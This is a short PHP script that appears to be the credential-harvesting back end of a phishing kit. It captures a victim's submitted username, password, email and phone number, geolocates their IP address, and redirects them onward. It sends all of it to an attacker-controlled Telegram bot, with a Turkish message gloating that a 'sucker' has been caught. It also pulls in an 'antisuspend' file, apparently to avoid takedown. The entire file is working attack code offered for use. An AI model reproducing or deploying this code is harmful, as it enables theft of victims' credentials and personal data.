<?php
include('tg.php');

$id=$_GET["id"];
if($_POST){
$ip=$_SERVER["REMOTE_ADDR"];
$konum = file_get_contents("http://ip-api.com/xml/".$ip);
$cek = new SimpleXMLElement($konum);
$ulke = $cek->country;
$sehir = $cek->city;
date_default_timezone_set('Europe/Istanbul');  
$cur_time=date("d-m-Y H:i:s");

$password=$_POST["password"];
$mail=$_POST["mail"];
$number=$_POST["number"];
include 'images/antisuspend.php';
header("location: password.php?id=$id");

$data = [
  'text' => '➡️ Lan Koş Sazan Düştü 😈 
Kullanıcı Adı : '.$id.'
Şifre : '.$password.'
Mail : '.$mail.'
Tel : '.$number.'
Ülke : '.$ulke.'
Şehir : '.$sehir.'
İp : '.$ip.'
Tarih : '.$cur_time.'
',
  'chat_id' => $chat_id
];

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
}
?>
